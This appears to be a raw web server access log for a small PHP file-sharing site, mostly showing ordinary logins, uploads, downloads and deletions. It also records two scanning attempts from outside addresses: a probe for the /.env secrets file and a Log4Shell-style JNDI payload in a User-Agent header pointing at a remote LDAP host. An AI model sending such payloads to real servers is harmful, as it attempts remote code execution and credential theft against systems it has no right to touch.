46.246.245.204 - - [14/Feb/2025:20:07:33 +0200] "POST /login.php HTTP/1.1" 200 494 "https://65.109.103.156/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:07:40 +0200] "POST /login.php HTTP/1.1" 302 5 "https://65.109.103.156/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:07:40 +0200] "GET /index.php HTTP/1.1" 200 1238 "https://65.109.103.156/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:08:06 +0200] "GET /active_users.php HTTP/1.1" 200 697 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:08:17 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/active_users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:08:25 +0200] "GET /active_users.php HTTP/1.1" 200 698 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:08:28 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/active_users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:08:30 +0200] "GET /users.php HTTP/1.1" 200 1008 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:08:41 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:08:43 +0200] "GET /active_users.php HTTP/1.1" 200 698 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:09:13 +0200] "GET /active_users.php HTTP/1.1" 200 698 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:09:43 +0200] "GET /active_users.php HTTP/1.1" 200 698 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:10:05 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/active_users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:10:06 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:10:08 +0200] "GET /index.php?user=pantgr HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:10:12 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php?user=pantgr" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
78.153.140.149 - - [14/Feb/2025:20:10:48 +0200] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
78.153.140.149 - - [14/Feb/2025:20:10:48 +0200] "POST / HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
190.212.140.11 - - [14/Feb/2025:20:11:09 +0200] "GET / HTTP/1.1" 302 5 "-" "/${jndi:ldap://81.181.248.148:1389/Exploit}" "-"
94.65.186.77 - - [14/Feb/2025:20:13:24 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:25 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:27 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:29 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:29 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:30 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:33 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:33 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:34 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:46 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:46 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:48 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:50 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:52 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:52 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:13:54 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:14:05 +0200] "GET /index.php HTTP/1.1" 200 1238 "https://65.109.103.156/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:14:06 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:14:08 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
188.166.85.35 - - [14/Feb/2025:20:14:42 +0200] "GET / HTTP/1.1" 302 5 "http://65.109.103.156/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:14:58 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:15 +0200] "GET /active_users.php HTTP/1.1" 200 741 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:23 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/active_users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:25 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:28 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:28 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:29 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:32 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:32 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:33 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1445 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:15:41 +0200] "GET /delete.php?token=55707f025cfe8b6533ea02c1683e48ed HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:15:41 +0200] "GET /index.php HTTP/1.1" 200 1184 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:15:45 +0200] "GET /delete.php?token=1a267a0ac90eedfcb231e99018df9b40 HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:15:45 +0200] "GET /index.php HTTP/1.1" 200 1135 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:15:47 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1341 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:15:51 +0200] "GET /delete.php?token=f838efe5501d6219ea2774274cd7899e HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:15:51 +0200] "GET /index.php HTTP/1.1" 200 1066 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:15:58 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:15:59 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:00 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:00 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:00 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:00 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:01 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:01 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:01 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:01 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:02 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:02 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:03 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:16:19 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1274 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:16:22 +0200] "GET /delete.php?token=21da76a933baf5ce0421fe5019f6a728 HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:16:22 +0200] "GET /index.php HTTP/1.1" 200 891 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:16:26 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:16:47 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:16:47 +0200] "GET /index.php HTTP/1.1" 200 1054 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:16:57 +0200] "GET /delete.php?token=1f1ded66f64dff59154f61c38886d72e HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:16:57 +0200] "GET /index.php HTTP/1.1" 200 891 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:17:00 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:01 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:02 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:02 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:02 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:03 +0200] "GET /index.php?user=pantgr HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:04 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php?user=pantgr" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:05 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php?user=pantgr" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:10 +0200] "GET /index.php?user=pantgr HTTP/1.1" 200 1094 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:16 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php?user=pantgr" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:16 +0200] "GET /index.php HTTP/1.1" 200 1265 "https://65.109.103.156/index.php?user=pantgr" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:27 +0200] "GET /delete.php?token=aef8ce482321b83f9bd042bd75a41825 HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:27 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:17:29 +0200] "GET /index.php HTTP/1.1" 200 1094 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:17:56 +0200] "POST /upload.php HTTP/1.1" 400 0 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:17:59 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:17:59 +0200] "GET /index.php HTTP/1.1" 200 1060 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:18:08 +0200] "GET /download.php?token=9dc3f86e4ff547f68e96be202d5b44da HTTP/1.1" 200 1620576 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:18:15 +0200] "GET /download.php?token=9dc3f86e4ff547f68e96be202d5b44da HTTP/1.1" 200 1620576 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:18:20 +0200] "GET /delete.php?token=9dc3f86e4ff547f68e96be202d5b44da HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:18:20 +0200] "GET /index.php HTTP/1.1" 200 891 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:22:08 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:22:09 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:22:17 +0200] "GET /index.php HTTP/1.1" 200 891 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:22:28 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:22:28 +0200] "GET /index.php HTTP/1.1" 200 1062 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:22:40 +0200] "GET /delete.php?token=717f733d352bd956b0ecd8f8374e68f6 HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:22:40 +0200] "GET /index.php HTTP/1.1" 200 891 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
94.65.186.77 - - [14/Feb/2025:20:23:37 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1095 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
46.246.245.204 - - [14/Feb/2025:20:23:50 +0200] "POST /upload.php HTTP/1.1" 302 5 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
46.246.245.204 - - [14/Feb/2025:20:23:50 +0200] "GET /index.php HTTP/1.1" 200 1053 "https://65.109.103.156/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" "-"
